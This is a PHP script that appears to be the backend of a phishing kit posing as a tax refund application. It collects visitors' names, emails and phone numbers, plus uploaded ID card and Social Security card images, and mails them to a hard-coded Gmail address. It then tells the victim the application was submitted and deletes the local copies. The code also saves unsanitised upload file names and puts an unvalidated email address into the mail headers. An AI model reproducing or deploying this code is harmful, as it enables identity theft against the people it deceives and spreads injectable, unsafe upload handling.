<?php
// Get the form data
$name = $_POST['name'];
$email = $_POST['email'];
$phone = $_POST['phone'];

// Process the uploaded files
$idCard = $_FILES['id-card'];
$ssn = $_FILES['ssn'];

// Define the email parameters
$to = 'paulorngu@gmail.com'; // Replace with your email address
$subject = 'Tax Refund Application';
$message = "Name: $name\n\nEmail: $email\n\nPhone: $phone";

// Attach the ID card
$idCardName = $idCard['name'];
$idCardTmpName = $idCard['tmp_name'];
$idCardPath = 'uploads/' . $idCardName;
move_uploaded_file($idCardTmpName, $idCardPath);
$attachments[] = $idCardPath;

// Attach the SSN
$ssnName = $ssn['name'];
$ssnTmpName = $ssn['tmp_name'];
$ssnPath = 'uploads/' . $ssnName;
move_uploaded_file($ssnTmpName, $ssnPath);
$attachments[] = $ssnPath;

$headers = "From: $email\r\n";
$headers .= "Reply-To: $email\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-Type: multipart/mixed; boundary=\"boundary\"\r\n";

$message = "--boundary\r\n";
$message .= "Content-Type: text/plain; charset=\"utf-8\"\r\n";
$message .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
$message .= $message . "\r\n\r\n";

foreach ($attachments as $attachment) {
    $file = fopen($attachment, 'rb');
    $data = fread($file, filesize($attachment));
    fclose($file);

    $message .= "--boundary\r\n";
    $message .= "Content-Type: application/octet-stream; name=\"" . basename($attachment) . "\"\r\n";
    $message .= "Content-Transfer-Encoding: base64\r\n";
    $message .= "Content-Disposition: attachment; filename=\"" . basename($attachment) . "\"\r\n\r\n";
    $message .= chunk_split(base64_encode($data)) . "\r\n\r\n";
}

$message .= "--boundary--";

// Send the email
if (mail($to, $subject, $message, $headers)) {
    // Success message
    echo 'Thank you! Your tax refund application has been submitted successfully we would contact you soon.';
} else {
    // Error message
    echo 'Oops! An error occurred while submitting your tax refund application. Please try again later.';
}

// Clean up the uploaded files
foreach ($attachments as $attachment) {
    unlink($attachment);
}
